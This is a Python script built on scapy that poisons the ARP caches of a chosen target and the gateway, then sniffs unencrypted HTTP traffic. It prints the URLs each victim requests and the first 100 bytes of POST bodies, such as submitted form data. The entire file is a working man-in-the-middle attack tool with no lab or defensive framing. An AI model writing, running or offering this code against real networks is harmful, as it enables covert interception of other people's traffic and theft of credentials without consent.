import sys
import time
import scapy.all as scapy
from scapy.all import conf
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw

def GetMac(ip):
    try:
        broad = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpR = scapy.ARP(pdst=ip)
        res = scapy.srp(broad/arpR, timeout=2, verbose=False)[0]
        return res[0][1].hwsrc if res else None
    except:
        return None

def spoofing(tip, gwip):
    targetmac = GetMac(tip)
    if targetmac:
        packet = scapy.ARP(op=2, pdst=tip, hwdst=targetmac, psrc=gwip)
        scapy.send(packet, verbose=False)
        return True
    else:
        print(f"[!] Couldn't find target MAC => {tip}")
        return False

def sniffP(iface):
    scapy.sniff(filter="tcp port 80", prn=Datas, iface=iface, store=False)

def Datas(packet):
    if packet.haslayer(HTTPRequest):
        try:
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            ip = packet[IP].src
            method = packet[HTTPRequest].Method.decode()
            print(f"[+] {ip} Requested {url} with {method}")
            
            if packet.haslayer(Raw) and method == "POST":
                try:
                    print(f"[*] data: {packet[Raw].load[:100]}...")  
                except:
                    print("[*] data (could not decode)")
                    
        except Exception as e:
            print(f"[!] Error processing packet: {e}")

def restore(Taip, Gwip):
    tmac = GetMac(Taip)
    gmac = GetMac(Gwip)
    if tmac and gmac:
        packet1 = scapy.ARP(op=2, pdst=Taip, hwdst=tmac, psrc=Gwip, hwsrc=gmac)
        packet2 = scapy.ARP(op=2, pdst=Gwip, hwdst=gmac, psrc=Taip, hwsrc=tmac)
        scapy.send(packet1, count=4, verbose=False)
        scapy.send(packet2, count=4, verbose=False)
        print(f"[@] Restored ARP tables for {Taip} and {Gwip}")
    else:
        print("[!] Could not restore ARP tables - MAC addresses not found")
def ArpSpoofAndSnoffing():
    target_ip = input("Enter target ip: ")
    target_mac = GetMac(target_ip)
    
    if not target_mac:
        print(f"[-] Unable to get MAC address for target IP => {target_ip}")
        sys.exit(1)
    Router = conf.route.route("0.0.0.0")[2]
    Inf = conf.route.route("0.0.0.0")[0]
    
    print(f"[+] Gateway IP: {Router}")
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Interface: {Inf}")
    print("[+] Starting ARP spoofing and sniffing...")
    print("Press Ctrl+C to stop and restore\n")

    try:
        sent = 0
        while True:
            if spoofing(target_ip, Router) and spoofing(Router, target_ip):
                sent += 2
                print(f"\r[+] Packets sent: {sent}", end="")
                sys.stdout.flush()
            if sent % 10 == 0:  
                sniffP(Inf)
                
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[!] Pressed Ctrl+C ")
        restore(target_ip, Router)
        print("[+] Cleanup complete. Exited.")
